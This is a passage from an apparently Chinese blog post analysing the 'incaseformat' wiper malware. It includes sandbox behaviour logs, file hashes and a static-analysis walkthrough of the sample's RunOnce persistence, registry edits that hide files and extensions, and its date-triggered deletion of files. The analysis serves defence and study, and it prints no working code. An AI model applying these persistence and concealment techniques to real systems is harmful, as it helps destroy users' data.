16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00170196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00160196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120197 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:527,	tsay.exe,	2568:4468,	2568,	FILE_touch,	C:\windows\ttry.exe,	access:0x00120196 alloc_size:460288 attrib:0x00000020 share_access:0x00000003 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:45:41:589,	tsay.exe,	2568:0,	2568,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:041,	tsay.exe,	5748:0,	5748,	EXEC_create,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:135,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000074DB0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:197,	tsay.exe,	5748:0,	5748,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000073CB0000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:228,	tsay.exe,	5748:7604,	5748,	FILE_touch,	C:\windows\ttry.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000005 options:0x00000044 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_truncate,	C:\windows\ttry.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:7604,	5748,	FILE_write,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
16:48:06:244,	tsay.exe,	5748:0,	5748,	FILE_modified,	C:\windows\ttry.exe,	,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:510,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:526,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:06:963,	tsay.exe,	5748:0,	5748,	PROC_exec,	C:\windows\ttry.exe,	target_pid:8840 cmdline:'&quot;C:\windows\ttry.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
16:48:07:010,	tsay.exe,	5748:7604,	5748,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475,	type:0x00000003 datalen:446 data:'05 09 00 00 00 00 00 00 04 00 04 00 01 02 06 00 ' ,	0x00000000 [操作成功完成。  ],	
16:48:07:072,	tsay.exe,	5748:0,	5748,	EXEC_destroy,	C:\Windows\tsay.exe,	parent_pid:4700 cmdline:'&quot;C:\Windows\tsay.exe&quot; ' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>生成的ttry.exe文件的动作如下：</p>
<pre><code>17:18:04:679,	ttry.exe,	9128:0,	9076,	EXEC_create,	C:\windows\ttry.exe,	parent_pid:9076 cmdline:'&quot;C:\windows\ttry.exe&quot; ' image_base:0x0000000000400000 image_size:0x00077000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:710,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.488_none_89e6152f0b32762e\comctl32.dll,	base:0x0000000075BA0000 size:0x0008D000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	EXEC_module_load,	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.488_none_11b1e5df2ffd8627\comctl32.dll,	base:0x0000000074810000 size:0x00212000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_truncate,	C:\windows\tsay.exe,	eof:0x00070600 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	FILE_write,	C:\windows\tsay.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:0,	9076,	FILE_modified,	C:\windows\tsay.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:04:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\msfsa,	type:0x00000001 datalen:40 data:'43 3A 5C 77 69 6E 64 6F 77 73 5C 74 73 61 79 2E ' ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_touch,	D:\share.exe,	access:0x0017019F alloc_size:460288 attrib:0x00000020 share_access:0x00000000 disposition:0x00000002 options:0x00000064 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_read,	C:\windows\ttry.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:9132,	9076,	FILE_write,	D:\share.exe,	offset:0x00000000 datalen:0x00020000 ,	0x00000000 [操作成功完成。  ],	
17:18:05:741,	ttry.exe,	9128:0,	9076,	FILE_modified,	D:\share.exe,	,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:18:06:757,	ttry.exe,	9128:9132,	9076,	REG_rmval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt\checkedvalue,	keyname:'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt' ,	0x00000000 [操作成功完成。  ],	
</code></pre><p>当时间调整为1月13日，运行ttry.exe动作如下：</p>
<pre><code>17:25:44:420,	ttry.exe,	7808:588,	7808,	FILE_truncate,	D:\incaseformat.log,	eof:0x00000000 ,	0x00000000 [操作成功完成。  ],	

......

17:25:53:524,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt,	type:0x00000004 datalen:4 data:'01 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:53:534,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_USERS\S-1-5-21-655661564-3040666061-2252561177-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden,	type:0x00000004 datalen:4 data:'02 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:53:551,	ttry.exe,	7808:588,	7808,	REG_setval,	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\checkedvalue,	type:0x00000004 datalen:4 data:'00 00 00 00 ' ,	0x00000000 [操作成功完成。  ],	
17:25:54:434,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\$RECYCLE.BIN\S-1-5-21-655661564-3040666061-2252561177-1000\desktop.ini,	,	0x00000000 [操作成功完成。  ],	
17:25:54:443,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\3rd-party-licenses.txt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:447,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\ca-bundle.crt,	,	0x00000000 [操作成功完成。  ],	
17:25:54:456,	ttry.exe,	7808:588,	7808,	FILE_remove,	D:\CHANGELOG,	,	0x00000000 [操作成功完成。  ],	
</code></pre><h2 id="2行为分析">2.行为分析</h2>
<p>在非删文件夹日期运行样本会创建C:\windows\tsay.exe，并将路径添加到开机自启的注册表中；</p>
<p>在删文件夹日期运行C:\windows\tsay.exe将会创建C:\windows\ttry.exe并执行起来，设置internet选项（不知道是拿来干啥）；</p>
<p>在非删文件夹日期运行C:\windows\ttry.exe，将会重置tsay.exe和启动项，然后将除c盘外的盘符中的文件夹，修改成文件夹名.exe，并修改注册表，隐藏文件夹后缀名（win10中并未生效）；</p>
<p>在删除文件夹日期运行C:\windows\ttry.exe，将会新建incaseformat.log，并删除其他文件。</p>
<h2 id="3样本分析">3.样本分析</h2>
<h3 id="31样本信息">3.1样本信息</h3>
<pre><code>C:\Users\ALEE\Desktop\incaseformat样本&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile tsay.exe sha256
SHA256 的 tsay.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

C:\Windows&gt;certutil -hashfile ttry.exe sha256
SHA256 的 ttry.exe 哈希:
8c8793eb7c80a09e1542e424ea89c23c195d364892620562e06b3df602890929
CertUtil: -hashfile 命令成功完成。

</code></pre><h3 id="32查壳情况">3.2查壳情况</h3>
<p>查一下壳，无壳delphi。</p>
<p><img src="/inc_images/2696940148582.png" alt=""></p>
<p>delphi程序使用<code>dede</code>和<code>idr</code>，可视化上要比直接使用<code>ida</code>好许多，这里使用的是<code>idr+ida</code>进行静态反汇编（<code>idr</code>查看结构，导出map，<code>ida</code>导入<code>map</code>，c代码生成，方便阅读）。</p>
<p>注：这里采用的时<code>ida7.5</code></p>
<h3 id="33静态分析">3.3静态分析</h3>
<p><code>idr</code>载入样本<code>ttry.exe</code>，查看<code>forms</code>，导出<code>map</code>。这里可以看到作者生存意识极强。</p>
<p><img src="/inc_images/1734812110161.png" alt=""></p>
<h4 id="formcreate分析">FormCreate分析</h4>
<p><code>ida</code>载入样本，导入<code>map</code>，查看<code>FormCreate</code>，<code>F5</code>代码生成，可以看到第61-73进行了一次文件是否存在的检查，不存在将进行自我复制。</p>
<p><img src="/inc_images/398113140163.png" alt=""></p>
<p>下方存在一次判断，如果为真，则将自身复制为ttry.exe，并新建进程启动。</p>
<p><img src="/inc_images/5034917158589.png" alt=""></p>
<h4 id="timer1timer分析">Timer1Timer分析</h4>
<p>该模块中有两个函数，从函数内进行分析，发现第一个函数存在驱动盘符读取的功能，第二个函数暂时不知道是什么功能……</p>
<p><img src="/inc_images/5336152186622.png" alt=""></p>
<p>进入函数<code>sub_44E5C8</code>函数观察上下文，</p>
<p><img src="/inc_images/713754179291.png" alt=""></p>
<p>进入<code>sub_44E54C</code>函数可以得知其功能是判断是否是有效磁盘。</p>
<p><img src="/inc_images/4288158175846.png" alt=""></p>
<h4 id="timer2timer分析">Timer2Timer分析</h4>
<p>该模块中有两个函数，第一个函数是磁盘信息的，第二个函数是删除文件及文件夹的函数。</p>
<p><img src="/inc_images/4515747158592.png" alt=""></p>
<p>在第37行到第60行，开始获取当前的年月日，如果年份小于2010或月份小于4月则不执行删除操作。如果大于2009或大于3月，却日期等于1、10、21、29号，则执行删除操作。</p>
<p><code>sub_44EC70</code>函数内容如下：</p>
<p><img src="/inc_images/1697453146459.png" alt=""></p>
<h4 id="timer3timer分析">Timer3Timer分析</h4>
<p>整个模块未引入其他函数，比较明显的是一些注册表操作</p>
<p><img src="/inc_images/3140339176625.png" alt=""></p>
<h4 id="timer4timer分析">Timer4Timer分析</h4>
<p>该模块的功能很简单，利用<code>TFileStream</code>文件流形式创建<code>incaseformat.log</code></p>
<p><img src="/inc_images/1496356169294.png" alt=""></p>
<h2 id="4结语">4.结语</h2>
<p>本次样本耗时很长，期间断断续续的进行了三四次，多线程是个好东西，就是不适合多长线程。分析过程中遇到的痛点和难点总结如下：</p>
<ul>
<li>注册表键值所对应的含义</li>
<li>delphi函数名称</li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
